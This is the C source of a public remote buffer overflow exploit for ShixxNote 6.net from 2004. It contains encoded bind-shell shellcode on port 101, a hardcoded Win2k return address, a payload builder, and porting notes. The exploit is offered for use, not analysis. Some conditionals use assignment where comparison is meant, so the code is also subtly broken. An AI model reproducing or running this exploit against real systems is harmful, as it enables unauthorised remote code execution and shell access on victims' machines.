/*
   ShixxNote 6.net buffer overflow exploit v0.1
   Public exploit overflows only Win2K systems, else crashs.
   Exploit code by class101 [at] DFind.kd-team.com
   Bind a shellcode to the port 101.
   Thanx to Luigi Auriemma(aluigi at altervista org) for the bug discovery
   Thanx to HDMoore and Metasploit.com for their kickass ASM work.
   Why Win2k only?
   After some days of debugging on it , I finally figured out how to exploit this
   hole, this public overflow method works only on Win2k, using the
   JMP EBX from comdlg32.dll from Win2k SP4 english.
   Because on WinXP , the register EBX points to a NULL address, this is not exploitable
   even if you update the JMP EBX, not exploitable VIA THIS WAY on XP I mean OK!.
   How do I did then on Win2k?
   I overwritte EIP with a JMP EBX, EBX is a perfect register because it points directly
   to my buffer, but problem, it points 4 bytes only before EIP, quite short...
   But enough to say him to jump ~80 bytes higher.
   Now i have enough space to adjust my shellcode to ESI and to finally jump to it...
   That's why on WinXP (and maybe others , havent tested) this doesnt works because EBX isnt
   available.
   Not happy? code yours or get a pvt version ;p
   How do I update to Win2k SP1 Dutch for example ?
   Grab a JMP EBX address in comdlg32.dll from this OS and update the code.
   Take a look at www.KD-Team.com, really nice peaces of code to find. Good job DiabloHorn ;)
   Take a look at www.GovernmentSecurity.org, good public place if you ignore all lame threads ^^ and all
   retarded, without to name them to not add credits to their stupidity....
   Greets cp, and sorry jester ....
 */

#include "winsock2.h"
#include "fstream.h"
#pragma comment(lib, "ws2_32")

//BIND shellcode port 101, XORed 0x88, thanx HDMoore.
char scode[] =
"\xEB"
"\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\x60\xDE\x88\x88\x88\xDB\xDD\xDE\xDF\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D"
"\xF0\x89\x62\x03\xC2\x90\x03\xD2\xA8\x89\x63\x6B\xBA\xC1\x03\xBC\x03\x89\x66\xB9"
"\x77\x74\xB9\x48\x24\xB0\x68\xFC\x8F\x49\x47\x85\x89\x4F\x63\x7A\xB3\xF4\xAC\x9C"
"\xFD\x69\x03\xD2\xAC\x89\x63\xEE\x03\x84\xC3\x03\xD2\x94\x89\x63\x03\x8C\x03\x89"
"\x60\x63\x8A\xB9\x48\xD7\xD6\xD5\xD3\x4A\x80\x88\xD6\xE2\xB8\xD1\xEC\x03\x91\x03"
"\xD3\x84\x03\xD3\x94\x03\x93\x03\xD3\x80\xDB\xE0\x06\xC6\x86\x64\x77\x5E\x01\x4F"
"\x09\x64\x88\x89\x88\x88\xDF\xDE\xDB\x01\x6D\x60\xAF\x88\x88\x88\x18\x89\x88\x88"
"\x3E\x91\x90\x6F\x2C\x91\xF8\x61\x6D\xC1\x0E\xC1\x2C\x92\xF8\x4F\x2C\x25\xA6\x61"
"\x51\x81\x7D\x25\x43\x65\x74\xB3\xDF\xDB\xBA\xD7\xBB\xBA\x88\xD3\x05\xC3\xA8\xD9"
"\x77\x5F\x01\x57\x01\x4B\x05\xFD\x9C\xE2\x8F\xD1\xD9\xDB\x77\xBC\x07\x77\xDD\x8C"
"\xD1\x01\x8C\x06\x6A\x7A\xA3\xAF\xDC\x77\xBF\x77\xDD\xB8\xB9\x48\xD8\xD8\xD8\xD8"
"\xC8\xD8\xC8\xD8\x77\xDD\xA4\x01\x4F\xB9\x53\xDB\xDB\xE0\x8A\x88\x88\xED\x01\x68"
"\xE2\x98\xD8\xDF\x77\xDD\xAC\xDB\xDF\x77\xDD\xA0\xDB\xDC\xDF\x77\xDD\xA8\x01\x4F"
"\xE0\xCB\xC5\xCC\x88\x01\x6B\x0F\x72\xB9\x48\x05\xF4\xAC\x24\xE2\x9D\xD1\x7B\x23"
"\x0F\x72\x09\x64\xDC\x88\x88\x88\x4E\xCC\xAC\x98\xCC\xEE\x4F\xCC\xAC\xB4\x89\x89"
"\x01\xF4\xAC\xC0\x01\xF4\xAC\xC4\x01\xF4\xAC\xD8\x05\xCC\xAC\x98\xDC\xD8\xD9\xD9"
"\xD9\xC9\xD9\xC1\xD9\xD9\xDB\xD9\x77\xFD\x88\xE0\xFA\x76\x3B\x9E\x77\xDD\x8C\x77"
"\x58\x01\x6E\x77\xFD\x88\xE0\x25\x51\x8D\x46\x77\xDD\x8C\x01\x4B\xE0\x77\x77\x77"
"\x77\x77\xBE\x77\x5B\x77\xFD\x88\xE0\xF6\x50\x6A\xFB\x77\xDD\x8C\xB9\x53\xDB\x77"
"\x58\x68\x61\x63\x6B\x90";

/*
//Execute regedit.exe, XORed 0x88, hardcoded Win2k SP4 English
char scode2[] = "\xEB"
"\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\xDD\x01\x6D\x09\x64\xC4\x88\x88\x88\xDB\x05\xF5\x3C\x4E\xCD\x7C\xFA\x4E\xCD"
"\x7D\xED\x4E\xCD\x7E\xEF\x4E\xCD\x7F\xED\x4E\xCD\x70\xEC\x4E\xCD\x71\xE1\x4E\xCD"
"\x72\xFC\x4E\xCD\x73\xA6\x4E\xCD\x74\xED\x4E\xCD\x75\xF0\x4E\xCD\x76\xED\x4E\xCD"
"\x77\x88\xE0\x8D\x88\x88\x88\x05\xCD\x7C\xD8\x30\xB7\xC8\xD0\xF4\x77\x58\xE0\x89"
"\x88\x88\x88\x30\xF5\x86\xD0\xF4\x77\x58\x68\x61\x63\x6B\x90";

 */
static char payload[5000];
char jmpebxw2k[]="\x79\x3c\xb6\x76"; //JMP EBX - comdlg32.dll - Win2k SP4 English
void usage(char* us);
WSADATA wsadata;
void ver();

int main(int argc,char *argv[])
{
 ver();
 if ((argc<2)||(argc>3)){usage(argv[0]);return -1;}
 if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){cout<<"[+] wsastartup error: "<<WSAGetLastError()<<endl;return -1;}
 int ip=htonl(inet_addr(argv[1])), sz, port, sizev, sizew, sizex, sizey, sizez, v, w, x, y, z;
 if (argc=3){port=atoi(argv[2]);}
 else port=2000;
 SOCKET s;
 struct fd_set mask;
 struct timeval timeout;
 struct sockaddr_in server;
 s=socket(AF_INET,SOCK_STREAM,0);

 if (s=INVALID_SOCKET){ cout<<"[+] socket() error: "<<WSAGetLastError()<<endl;WSACleanup();return -1;}
 server.sin_family=AF_INET;
 server.sin_addr.s_addr=htonl(ip);
 server.sin_port=htons(port);
 WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
 timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
 switch(select(s+1,NULL,&mask,NULL,&timeout))
 {
  case -1: {cout<<"[+] select() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
  case 0: {cout<<"[+] connect() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
  default:
   if(FD_ISSET(s,&mask))
   {
    cout<<"[+] connected, constructing the payload..."<<endl;
    Sleep(1000);
    sizev=5;
    sizew=88;
    sizey=800-sizeof(scode);
    sizex=5;
    sizez=20;
    sz=sizev+sizew+sizex+sizez+sizeof(scode)+sizey;
    memset(payload,0,sizeof(payload));
    strcat(payload,"");
    for (v=0;v<sizev;v++){strcat(payload,"\x61");}
    strcat(payload,"\x66\x8b\xf3");
    strcat(payload,"\x66\x83\xc6\x09");
    strcat(payload,"\xff\xe6");
    for (w=0;w<sizew;w++){strcat(payload,"\x61");}
    strcat(payload,"\xeb");
    strcat(payload,"\x9d\x61\x61");
    strcat(payload,jmpebxw2k);
    for (x=0;x<sizex;x++){strcat(payload,"\x90");}
    strcat(payload,scode);
    for (y=0;y<sizey;y++){strcat(payload,"\x61");}
    for (z=0;z<sizez;z++){strcat(payload,"~");}

    if (send(s,payload,strlen(payload),0)=SOCKET_ERROR) { cout<<"[+] sending error, the server prolly rebooted."<<endl;return -1;}
    cout<<"[+] size of payload: "<<sz<<endl;
    cout<<"[+] payload send, connect the port 101 to get a shell."<<endl;
    return 0;
   }

 }

 closesocket(s);
 WSACleanup();
 return 0;
}

void usage(char* us)
{
 cout<<"USAGE: 101_shixx.exe Ip Port\n"<<endl;
 cout<<"NOTE: "<<endl;
 cout<<" The port 2000 is default if no port specified."<<endl;
 cout<<" The exploit bind a shellcode to the port 101."<<endl;
 cout<<" Public version - Win2k systems only"<<endl;
 cout<<" Update the JMP address for another SP/Language"<<endl;
 return;
}
void ver()
{
 cout<<endl;
 cout<<" "<<endl;
 cout<<" ==========================[v0.1]=="<<endl;
 cout<<" ====ShixxNote 6.net, Remote Buffer Overflow Exploit===="<<endl;
 cout<<" ===coded by class101======[DFind.kd-team.com 2004]=="<<endl;
 cout<<" ==============================="<<endl;
 cout<<" "<<endl;
} 

// milw0rm.com [2004-10-22]
